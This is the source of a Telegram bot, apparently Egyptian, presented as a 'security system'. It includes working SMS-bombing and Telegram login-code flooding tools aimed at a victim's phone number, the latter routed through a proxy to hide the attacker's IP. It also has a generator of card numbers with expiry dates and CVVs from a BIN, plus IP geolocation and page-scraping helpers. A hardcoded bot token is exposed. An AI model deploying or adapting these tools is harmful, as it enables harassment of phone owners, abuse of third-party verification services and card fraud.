import telebot
from telebot import types
import random
import requests
import platform
import base64
import time
import re
import threading
import string
import json
import os
import io
import sys
import phonenumbers
from phonenumbers import geocoder, carrier, timezone, phonenumberutil
from datetime import datetime

# ==========================================
# 1. إعدادات النظام والتهيئة
# ==========================================
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except:
    pass

# ضع التوكن الخاص بك هنا
TOKEN = '8408417562:AAGbJ1VuFQ7nzTQhrTl72Atv5tkBmyFJWlU'
# ضع الآيدي الخاص بك (الأدمن) هنا
ADMIN_ID = 1431886140

# --- إعدادات البروكسي (لحماية الـ IP) ---
# هام: لكي تخفي هويتك، يجب عليك وضع بروكسي هنا.
# إذا تركته None سيستخدم البوت IP جهازك ولن تكون محميًا.
# مثال لطريقة الكتابة:
# MY_PROXY = {
#    "http": "http://user:pass@123.45.67.89:8080",
#    "https": "http://user:pass@123.45.67.89:8080"
# }
# مثال توضيحي للصيغة فقط (لن يعمل كبروكسي خارجي)
MY_PROXY = {
   "http": "http://127.0.0.1:8080",
   "https": "http://127.0.0.1:8080"
}

bot = telebot.TeleBot(TOKEN)
active_processes = {}  # لتخزين عمليات السبام النشطة

# ==========================================
# 2. إدارة قاعدة البيانات (Users DB)
# ==========================================
DB_FILE = "users_db.json"

def load_db():
    if not os.path.exists(DB_FILE): return {}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {}

def save_db(data):
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=4)
    except: pass

def check_user(user):
    """تسجيل المستخدم وفحص الحظر"""
    db = load_db()
    uid = str(user.id)
    if uid not in db:
        db[uid] = {"name": user.first_name, "banned": False}
        save_db(db)
        try:
            if int(uid) != ADMIN_ID:
                bot.send_message(ADMIN_ID, f"🔔 <b>عضو جديد:</b> {user.first_name} (`{uid}`)", parse_mode="HTML")
        except: pass
    return db[uid].get("banned", False)

def toggle_ban(uid, status):
    db = load_db()
    if str(uid) in db:
        db[str(uid)]["banned"] = status
        save_db(db)
        return True
    return False

# ==========================================
# 3. واجهة المستخدم (اللوحة الرئيسية)
# ==========================================
def main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    
    # قسم الأدوات العامة
    btn1 = types.KeyboardButton("💳 توليد فيزا (BIN)")
    btn2 = types.KeyboardButton("📱 تحليل رقم هاتف")
    
    # الأدوات الجديدة
    btn_ip = types.KeyboardButton("📍 كشف مكان IP")
    btn_sc = types.KeyboardButton("📥 سحب كود موقع")
    
    btn3 = types.KeyboardButton("✂️ اختصار روابط")
    btn4 = types.KeyboardButton("🌐 فحص حالة موقع")
    btn5 = types.KeyboardButton("🔐 تشفير/فك ملفات")
    btn6 = types.KeyboardButton("📝 تشفير/فك نصوص")
    
    # قسم أدوات الهجوم
    btn_sms = types.KeyboardButton("🔥 SMS Spam")
    btn_tele = types.KeyboardButton("✈️ Tele Spam")
    
    # قسم المعلومات
    btn_fake = types.KeyboardButton(text="📞 Fake Calls", web_app=types.WebAppInfo(url="https://callmyphone.org/app"))
    btn_web = types.KeyboardButton(text="🌐 موقع المطور", web_app=types.WebAppInfo(url="https://mahmoud-ab0-elfadl.netlify.app/"))
    
    btn_tips = types.KeyboardButton("🛡️ نصائح أمنية")
    btn_info = types.KeyboardButton("ℹ️ المطور")

    # ترتيب الأزرار
    markup.add(btn_sms, btn_tele)
    markup.add(btn_ip, btn_sc) 
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    markup.add(btn5, btn6)
    markup.add(btn_fake, btn_web)
    
    # تم إزالة زر معلومات النظام من هنا ووضعه في الأسفل للأدمن فقط
    markup.add(btn_tips, btn_info)

    # يظهر للأدمن فقط
    if user_id == ADMIN_ID:
        markup.add(types.KeyboardButton("⚙️ Admin Panel"), types.KeyboardButton("🖥️ معلومات النظام"))
    
    return markup

# ==========================================
# 4. بداية البوت (/start)
# ==========================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if check_user(message.from_user):
        bot.reply_to(message, "⛔ <b>عذراً، أنت محظور من استخدام البوت.</b>", parse_mode="HTML")
        return

    welcome_text = (
        f"★ <b>ABO-ELFADL SECURITY SYSTEM</b> ★\n"
        f"👋 أهلاً بك يا <b>{message.from_user.first_name}</b>\n\n"
        "🚀 <b>تم تحديث النظام!</b>\n"
        "تم إضافة أدوات تتبع IP وسحب الأكواد المصدرية.\n"
        "👇 اختر الخدمة من القائمة:"
    )
    bot.reply_to(message, welcome_text, parse_mode="HTML", reply_markup=main_keyboard(message.from_user.id))

# ==========================================
# 5. الموجه الرئيسي للرسائل (Master Handler)
# ==========================================
@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    if check_user(message.from_user): return

    text = message.text
    chat_id = message.chat.id

    # --- الأدوات الجديدة ---
    if text == "📍 كشف مكان IP":
        msg = bot.reply_to(message, "🌍 أرسل عنوان IP (مثال: 8.8.8.8):")
        bot.register_next_step_handler(msg, process_ip_lookup)

    elif text == "📥 سحب كود موقع":
        msg = bot.reply_to(message, "🌐 أرسل رابط الموقع (مثال: https://google.com):")
        bot.register_next_step_handler(msg, process_source_code_download)

    # --- الأدوات السابقة ---
    elif text == "💳 توليد فيزا (BIN)":
        msg = bot.reply_to(message, "🔢 أرسل الـ BIN (أول 6 أرقام):", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_visa_gen)

    elif text == "📱 تحليل رقم هاتف":
        msg = bot.reply_to(message, "📞 أرسل الرقم دولياً (مثال: +2010xxxx):")
        bot.register_next_step_handler(msg, process_phone_track)

    elif text == "✂️ اختصار روابط":
        msg = bot.reply_to(message, "🔗 أرسل الرابط الطويل:")
        bot.register_next_step_handler(msg, process_url_shorten)

    elif text == "🌐 فحص حالة موقع":
        msg = bot.reply_to(message, "🌍 أرسل رابط الموقع:")
        bot.register_next_step_handler(msg, process_site_check)

    elif text == "🔐 تشفير/فك ملفات":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton('تشفير ملف 🔒', callback_data='file_en'),
                   types.InlineKeyboardButton('فك تشفير ملف 🔓', callback_data='file_de'))
        bot.reply_to(message, "اختر العملية:", reply_markup=markup)

    elif text == "📝 تشفير/فك نصوص":
        msg = bot.reply_to(message, "🔏 أرسل النص للتشفير أو كود Base64 لفكه:")
        bot.register_next_step_handler(msg, process_text_base64)

    # --- تعديل: معلومات النظام للأدمن فقط ---
    elif text == "🖥️ معلومات النظام":
        if chat_id != ADMIN_ID:
            bot.reply_to(message, "⛔ هذا الأمر للمطور فقط.")
            return
        info = (f"💻 <b>System Info:</b>\nOS: {platform.system()}\nVer: {platform.release()}")
        bot.reply_to(message, info, parse_mode="HTML")

    elif text == "🛡️ نصائح أمنية":
        bot.reply_to(message, "🛡️ لا تقم بتحميل كود غير موثوق به.")

    # --- أدوات الهجوم ---
    elif text == "🔥 SMS Spam":
        msg = bot.reply_to(message, "📲 <b>أدخل الرقم المصري (بدون +2):</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, get_sms_phone)

    elif text == "✈️ Tele Spam":
        msg = bot.reply_to(message, "✈️ <b>أدخل الرقم الدولي (مع مفتاح الدولة):</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, get_tele_phone)

    elif text == "ℹ️ المطور":
        bot.reply_to(message, "👨‍💻 <b>Dev: Mahmoud AboElfadl</b>", parse_mode="HTML")

    elif text == "⚙️ Admin Panel":
        if chat_id == ADMIN_ID:
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(types.InlineKeyboardButton("🚫 حظر", callback_data='ban_user'),
                       types.InlineKeyboardButton("✅ فك", callback_data='unban_user'),
                       types.InlineKeyboardButton("📜 قائمة", callback_data='list_users'))
            bot.reply_to(message, "⚙️ لوحة التحكم:", reply_markup=markup)
        else:
            bot.reply_to(message, "⛔ للمطور فقط.")

# ==========================================
# 6. دوال المعالجة (Logic Functions)
# ==========================================

# --- IP Geolocation Logic ---
def process_ip_lookup(message):
    ip = message.text.strip()
    if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
        bot.reply_to(message, "❌ هذا لا يبدو كعنوان IP صحيح (IPv4).")
        return

    bot.reply_to(message, "🔍 جارٍ البحث عن البيانات...")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
        data = response.json()

        if data['status'] == 'fail':
            bot.reply_to(message, f"❌ فشل البحث: {data.get('message', 'Unknown error')}")
            return

        report = (
            f"📍 <b>IP Report:</b> `{data['query']}`\n"
            f"━━━━━━━━━━━━━━\n"
            f"🌍 <b>Country:</b> {data['country']} ({data['countryCode']})\n"
            f"🏙️ <b>City:</b> {data['city']}, {data['regionName']}\n"
            f"📮 <b>Zip:</b> {data['zip']}\n"
            f"📡 <b>ISP:</b> {data['isp']}\n"
            f"🏢 <b>Org:</b> {data['org']}\n"
            f"🕑 <b>Timezone:</b> {data['timezone']}\n"
            f"📍 <b>Google Maps:</b> <a href='https://www.google.com/maps/search/?api=1&query={data['lat']},{data['lon']}'>Click Here</a>"
        )
        bot.reply_to(message, report, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ أثناء الاتصال: {e}")

# --- Source Code Downloader Logic ---
def process_source_code_download(message):
    url = message.text.strip()
    if not url.startswith('http'):
        url = 'https://' + url

    status_msg = bot.reply_to(message, "⏳ جارٍ الاتصال بالموقع وسحب الكود...")
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            file_data = io.BytesIO(response.content)
            file_data.name = "source_code.html"
            
            caption = (
                f"✅ <b>تم سحب الكود بنجاح!</b>\n"
                f"🔗 الرابط: {url}\n"
                f"📦 الحجم: {len(response.content) / 1024:.2f} KB"
            )
            bot.send_document(message.chat.id, file_data, caption=caption, parse_mode="HTML")
            bot.delete_message(message.chat.id, status_msg.message_id)
        else:
            bot.edit_message_text(f"❌ فشل السحب. كود الحالة: {response.status_code}", message.chat.id, status_msg.message_id)
            
    except Exception as e:
        bot.edit_message_text(f"❌ حدث خطأ: {str(e)}", message.chat.id, status_msg.message_id)

# --- General Functions ---
def process_visa_gen(message):
    try:
        bin_val = message.text.strip()
        if len(bin_val) < 6: return bot.reply_to(message, "⚠️ أرسل 6 أرقام.")
        results = []
        for _ in range(10):
            rnd = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            month, year, cvv = random.randint(1, 12), random.randint(2025, 2030), random.randint(100, 999)
            results.append(f"`{bin_val[:6]}{rnd}|{month:02d}|{year}|{cvv}`")
        bot.reply_to(message, "✅ **تم التوليد:**\n" + "\n".join(results), parse_mode="Markdown")
    except: pass

def process_phone_track(message):
    try:
        num = message.text
        parsed = phonenumbers.parse(num, None)
        valid = phonenumbers.is_valid_number(parsed)
        country = geocoder.description_for_number(parsed, "ar")
        operator = carrier.name_for_number(parsed, "ar")
        bot.reply_to(message, f"🔎 **تحليل:**\n✅ صالح: {valid}\n🌍 الدولة: {country}\n🏢 الشركة: {operator}", parse_mode="Markdown")
    except: bot.reply_to(message, "❌ تأكد من صيغة الرقم الدولية (+).")

def process_url_shorten(message):
    try:
        url = f'https://is.gd/create.php?format=simple&url={message.text}'
        bot.reply_to(message, f"✅ المختصر:\n{requests.get(url).text}")
    except: pass

def process_site_check(message):
    url = message.text
    if not url.startswith('http'): url = 'https://' + url
    try:
        st = time.time()
        r = requests.get(url, timeout=10)
        bot.reply_to(message, f"✅ **Online**\nCode: {r.status_code}\nTime: {round(time.time()-st, 2)}s", parse_mode="Markdown")
    except: bot.reply_to(message, "❌ Offline")

def process_text_base64(message):
    text = message.text
    try:
        bot.reply_to(message, f"🔓 **فك:**\n`{base64.b64decode(text).decode('utf-8')}`", parse_mode="Markdown")
    except:
        bot.reply_to(message, f"🔐 **تشفير:**\n`{base64.b64encode(text.encode('utf-8')).decode('utf-8')}`", parse_mode="Markdown")

# --- SMS Spam Logic ---
def get_sms_phone(message):
    phone = message.text
    if not phone.isdigit(): return
    if phone.startswith("01"): phone = "2" + phone
    msg = bot.reply_to(message, "🔢 **العدد؟**", parse_mode="HTML")
    bot.register_next_step_handler(msg, lambda m: start_spam_sms(m, phone))

def start_spam_sms(message, phone):
    if not message.text.isdigit(): return
    count = int(message.text)
    chat_id = message.chat.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 إيقاف", callback_data='stop_sms_attack'))
    status_msg = bot.send_message(chat_id, f"🔥 <b>جارٍ الهجوم على {phone}...</b>", reply_markup=markup, parse_mode="HTML")
    active_processes[chat_id] = {'running': True}

    def run():
        url = "https://api.twistmena.com/music/Dlogin/sendCode"
        success = 0
        for i in range(count):
            if not active_processes.get(chat_id, {}).get('running', False): break
            rv = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
            try: 
                if requests.post(url, json={"dial": phone, "randomValue": rv}, timeout=3).status_code == 200: success += 1
            except: pass
            if i % 5 == 0:
                try: bot.edit_message_text(f"🔥 تم إرسال: {success}/{count}", chat_id, status_msg.message_id, reply_markup=markup)
                except: pass
            time.sleep(1.5)
        try: bot.edit_message_reply_markup(chat_id, status_msg.message_id, reply_markup=None)
        except: pass
        bot.send_message(chat_id, f"✅ انتهى. نجاح: {success}")
    threading.Thread(target=run).start()

# --- Tele Spam Logic (معدلة لاستخدام البروكسي) ---
def get_tele_phone(message):
    phone = message.text
    msg = bot.reply_to(message, "🔢 **المحاولات؟**", parse_mode="HTML")
    bot.register_next_step_handler(msg, lambda m: start_spam_tele(m, phone))

def start_spam_tele(message, phone):
    if not message.text.isdigit(): return
    count = int(message.text)
    chat_id = message.chat.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 إيقاف", callback_data='stop_tele_attack'))
    status_msg = bot.send_message(chat_id, f"✈️ <b>بدأ إزعاج تليجرام...</b>", reply_markup=markup, parse_mode="HTML")
    active_processes[chat_id] = {'running': True}

    # هنا يتم استخدام البروكسي الذي وضعته في الأعلى
    req_proxies = MY_PROXY if MY_PROXY else None

    def run():
        success = 0
        for i in range(count):
            if not active_processes.get(chat_id, {}).get('running', False): break
            try: 
                # تم تمرير البروكسي في الطلب
                if requests.post('https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en', 
                               data={'phone': phone}, 
                               timeout=5,
                               proxies=req_proxies).text == "true": 
                    success += 1
            except: pass
            time.sleep(1.0)
        bot.send_message(chat_id, f"✅ تم الانتهاء: {success}")
    threading.Thread(target=run).start()

# ==========================================
# 7. معالجة الـ Callbacks
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    if call.data in ['stop_sms_attack', 'stop_tele_attack']:
        if chat_id in active_processes:
            active_processes[chat_id]['running'] = False
            bot.answer_callback_query(call.id, "تم الإيقاف")
        return

    if call.data == 'file_en':
        msg = bot.send_message(chat_id, "📂 أرسل الملف لتشفيره:")
        bot.register_next_step_handler(msg, file_encrypt_step)
    elif call.data == 'file_de':
        msg = bot.send_message(chat_id, "📂 أرسل الملف لفك تشفيره:")
        bot.register_next_step_handler(msg, file_decrypt_step)

    if call.from_user.id == ADMIN_ID:
        if call.data == 'ban_user':
            msg = bot.send_message(chat_id, "🚫 أرسل ID لحظره:")
            bot.register_next_step_handler(msg, lambda m: do_ban(m, True))
        elif call.data == 'unban_user':
            msg = bot.send_message(chat_id, "✅ أرسل ID لفك الحظر:")
            bot.register_next_step_handler(msg, lambda m: do_ban(m, False))
        elif call.data == 'list_users':
            db = load_db()
            txt = "\n".join([f"{k}: {'🚫' if v['banned'] else '🟢'} {v['name']}" for k,v in db.items()])
            bot.send_message(chat_id, txt if txt else "القائمة فارغة")

def do_ban(message, status):
    if toggle_ban(message.text.strip(), status): bot.reply_to(message, "✅ تم.")
    else: bot.reply_to(message, "❌ خطأ.")

def file_encrypt_step(message):
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            encoded = base64.b64encode(bot.download_file(file_info.file_path))
            bot.send_document(message.chat.id, encoded, caption="✅ ملف مشفر", visible_file_name="encrypted.txt")
        except: bot.reply_to(message, "خطأ")

def file_decrypt_step(message):
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            decoded = base64.b64decode(bot.download_file(file_info.file_path))
            bot.send_document(message.chat.id, decoded, caption="✅ ملف مفكوك")
        except: bot.reply_to(message, "خطأ في الملف")

# ==========================================
# 8. التشغيل المستمر
# ==========================================
print("--- SYSTEM STARTED ---")
while True:
    try:
        bot.infinity_polling(timeout=20, long_polling_timeout=10)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)